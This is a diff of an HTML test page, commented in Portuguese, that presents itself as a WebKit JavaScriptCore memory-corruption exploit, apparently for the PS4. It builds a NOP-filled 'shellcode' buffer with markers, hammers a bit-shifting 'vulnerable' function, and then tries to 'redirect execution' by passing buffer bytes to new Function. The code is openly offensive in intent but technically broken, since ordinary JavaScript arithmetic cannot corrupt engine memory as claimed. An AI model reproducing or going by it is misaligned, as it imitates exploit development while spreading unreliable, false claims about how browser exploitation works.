@@ -1,104 +1,126 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebKit Test</title>
+    <title>WebKit Exploit Test</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; }
-        #log { white-space: pre; padding: 20px; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        #log { white-space: pre; border: 1px solid #0f0; padding: 15px; }
     </style>
 </head>
 <body>
-    <div id="log">Inicializando teste WebKit JSC...</div>
+    <div id="log">[+] Inicializando teste de exploração WebKit JSC...</div>
 
 <script>
-// exploit.js - Código completo para PS4 (versão educacional)
-const LOG_ELEMENT = document.getElementById('log');
-let logs = '';
+// Configurações críticas
+const PAYLOAD_SIZE = 0x40000; // 256KB
+const NOP = 0x90909090; 
+const MARKER_START = 0xBADF00D;
+const MARKER_END = 0xDEADBEEF;
 
-function log(msg) {
-    logs += msg + '\n';
-    LOG_ELEMENT.textContent = logs;
-    window.scrollTo(0, document.body.scrollHeight);
-}
-
-// Alocação de memória estratégica
-const PAYLOAD_SIZE = 0x20000;
+// Alocação estratégica de memória
 let shellcodeBuffer = new ArrayBuffer(PAYLOAD_SIZE);
 let memoryView = new Uint32Array(shellcodeBuffer);
 
-// Preenche com NOPs + shellcode placeholder
+// Preenche payload com marcadores
 for(let i = 0; i < PAYLOAD_SIZE/4; i++) {
-    memoryView[i] = 0x90909090; // NOP slide (substitua pelo shellcode real)
+    memoryView[i] = i === 0 ? MARKER_START : 
+                   i === (PAYLOAD_SIZE/4)-1 ? MARKER_END : 
+                   NOP;
 }
 
-function triggerVuln(a, b, c) {
-    let x = a | 0x80000000;
-    let y = (b | 0) - 25;  // Underflow controlado
-    let z = (c & 0x3F) + 64;
+// Sistema de logs
+const LOG_ELEMENT = document.getElementById('log');
+let exploitLog = '';
 
-    // Operação vulnerável
-    z = (x << y) | (x >> (32 - y));
-    let r = z ^ 0xDEADBEEF;
-    let s = z ^ 0xCAFEBABE;
-
-    return ((x >>> r) << s) >> s;
+function log(msg) {
+    exploitLog += msg + '\n';
+    LOG_ELEMENT.textContent = exploitLog;
+    window.scrollTo(0, document.body.scrollHeight);
 }
 
-function executeExploit() {
+// Função vulnerável modificada
+function triggerVulnerability(a, b, c) {
     try {
-        log('[+] Alocando memória...');
-        let testArray = [];
+        let x = a | 0x80000000;
+        let y = (b | 0) - 75;  // Underflow extremo
+        let z = (c & 0x7F) + 128;
         
-        // Fase 1: Corromper estruturas de memória
-        for(let i = 0; i < 1000; i++) {
-            let res = triggerVuln(
+        // Operação crítica
+        z = (x << y) | (x >>> (32 - y));
+        let r = z ^ 0xCAFEBABE;
+        let s = z ^ 0xDEADC0DE;
+        
+        return ((x >>> r) << s) >> s;
+    } catch(e) {
+        log(`[!] Erro na função: ${e}`);
+        return 0;
+    }
+}
+
+// Rotina de exploração
+function runExploitSequence() {
+    log('[+] Fase 1 - Corrupção de memória');
+    let testArray = [];
+    
+    try {
+        // Loop principal agressivo
+        for(let i = 0; i < 1500; i++) {
+            let res = triggerVulnerability(
                 i & 0xFF,
-                -30 + (i % 40),
-                0x7FFFFFFF - (i % 128)
+                -100 + (i % 150), // Variação extrema
+                0x7FFFFFFF - (i % 256)
             );
             
             testArray.push(res);
             
-            if(i % 100 === 0) {
-                log(`[+] Iteração ${i}: 0x${(res >>> 0).toString(16)}`);
-                // Força coleta de lixo para estabilização
-                if(window.gc) window.gc();
+            // Log estratégico
+            if(i % 50 === 0) {
+                log(`[•] Iteração ${i}: 0x${res.toString(16).padStart(8, '0')}`);
+                if(window.gc) window.gc(); // Força coleta de lixo
+            }
+            
+            // Detecção precoce de anomalia
+            if(res > 0x10000 && res !== NOP) {
+                log(`[!] Valor suspeito em i=${i}: 0x${res.toString(16)}`);
             }
         }
 
-        // Fase 2: Tentativa de execução controlada
-        log('[+] Tentando redirecionar fluxo...');
-        let fakeObj = {
-            header: 0x43434343,
-            payload: shellcodeBuffer
-        };
-
-        // Acesso a memória potencialmente corrompida
-        setTimeout(() => {
+        log('[+] Fase 2 - Verificação de corrupção');
+        let corrupted = false;
+        
+        // Verifica marcadores de memória
+        if(memoryView[0] !== MARKER_START) {
+            log(`[!] Marcador inicial corrompido: 0x${memoryView[0].toString(16)}`);
+            corrupted = true;
+        }
+        
+        if(memoryView[(PAYLOAD_SIZE/4)-1] !== MARKER_END) {
+            log(`[!] Marcador final corrompido: 0x${memoryView[(PAYLOAD_SIZE/4)-1].toString(16)}`);
+            corrupted = true;
+        }
+        
+        // Tenta disparar payload
+        if(corrupted) {
+            log('[+] Tentando redirecionar execução...');
             try {
-                let target = memoryView[0];
-                log(`[+] Ponteiro obtido: 0x${target.toString(16)}`);
-                
-                if(target !== 0x90909090) {
-                    log('[!] Possível controle de execução detectado!');
-                    // Simulação de execução de shellcode
-                    new Function(memoryView)();
-                }
+                new Uint8Array(shellcodeBuffer).fill(0xCC, 0, 3); // int3 breakpoint
+                let func = new Function('return ' + String.fromCharCode(...new Uint8Array(shellcodeBuffer)));
+                func();
             } catch(e) {
-                log(`[!] Erro final: ${e}`);
+                log(`[!] Erro na execução: ${e}`);
             }
-        }, 500);
-
+        }
+        
     } catch(e) {
-        log(`[!] Crash detectado: ${e}`);
+        log(`[!] Erro fatal: ${e.stack || e}`);
     }
 }
 
-// Inicia após 2 segundos
+// Inicia após 3 segundos
 setTimeout(() => {
-    log('[+] Iniciando sequência de exploração');
-    requestAnimationFrame(executeExploit);
-}, 2000);
+    log('[+] Iniciando sequência em 3...2...1');
+    requestAnimationFrame(runExploitSequence);
+}, 3000);
 </script>
 </body>
 </html>
